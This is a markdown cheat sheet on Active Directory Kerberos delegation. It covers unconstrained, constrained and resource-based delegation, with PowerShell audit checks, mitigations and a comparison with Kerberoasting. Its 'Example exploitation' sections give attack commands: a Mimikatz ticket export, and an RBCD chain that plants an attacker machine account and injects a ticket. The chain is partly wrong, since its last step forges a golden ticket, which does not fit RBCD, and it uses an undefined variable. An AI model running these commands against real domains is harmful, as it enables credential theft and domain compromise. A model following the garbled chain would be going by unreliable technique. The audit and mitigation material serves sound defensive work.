# Active Directory Delegation

## Overview

Delegation allows a service to authenticate on behalf of a user. It is used to support Single Sign-On (SSO). If delegation is misconfigured, privilege escalation or domain compromise may occur.

---

## Types of Delegation

### 1. Unconstrained Delegation

**Description:**  
A service with Unconstrained Delegation can store any user’s Kerberos TGT. If an attacker gains SYSTEM access on such a machine, they can capture high-privilege tickets.

**Check:**
```powershell
Get-ADObject -Filter {userAccountControl -band 0x80000} -Properties Name
```

**Example exploitation:**

```powershell
mimikatz.exe privilege::debug sekurlsa::tickets /export
```

**Mitigation:**

* Disable Unconstrained Delegation.
* Allow delegation only when necessary.
* Never enable Unconstrained Delegation on Domain Controllers.

---

### 2. Constrained Delegation

**Description:**
Allows delegation only to specific target services defined in AD.

**Check:**

```powershell
Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)"
```

**Inspect allowed delegation targets:**

```powershell
Get-ADUser -Identity <USERNAME> -Properties msDS-AllowedToDelegateTo
```

**Mitigation:**

* Limit delegation to trusted services.
* Regularly audit accounts with delegation enabled.
* Enforce strong passwords for delegated service accounts.

---

### 3. Resource-Based Constrained Delegation (RBCD)

**Description:**
The target service controls which accounts may act on its behalf by modifying `msDS-AllowedToActOnBehalfOfOtherIdentity`.

**Check:**

```powershell
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne "$null"}
```

**Example exploitation:**

1. Create a machine account:

```powershell
New-ADComputer -Name "AttackerMachine" -SamAccountName "AttackerMachine" -Instance $Comp -PassThru
```

2. Add it to the victim machine’s allowed delegation list:

```powershell
Set-ADComputer -Identity "VictimServer" -PrincipalsAllowedToDelegateToAccount "AttackerMachine"
```

3. Inject a ticket:

```powershell
mimikatz.exe kerberos::golden /domain:<DOMAIN> /sid:<SID> /target:<DC_IP> /rc4:<NTLM_HASH> /user:Administrator /ptt
```

**Mitigation:**

* Monitor modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity`.
* Restrict use of RBCD to trusted services.
* Enforce strong password policies for service accounts.

---

## Delegation Attacks vs. Kerberoasting

| Feature     | Delegation Attacks               | Kerberoasting                           |
| ----------- | -------------------------------- | --------------------------------------- |
| Purpose     | Abuse authentication delegation  | Extract service account password hashes |
| Attack Type | Privilege escalation             | Offline password cracking               |
| Requirement | Delegation-enabled account       | SPN-enabled account                     |
| Target      | Services with delegation enabled | Service accounts with weak passwords    |
| Tools       | Rubeus, Mimikatz, PowerView      | GetUserSPNs.py, Hashcat                 |
| Risk Level  | High                             | Medium                                  |
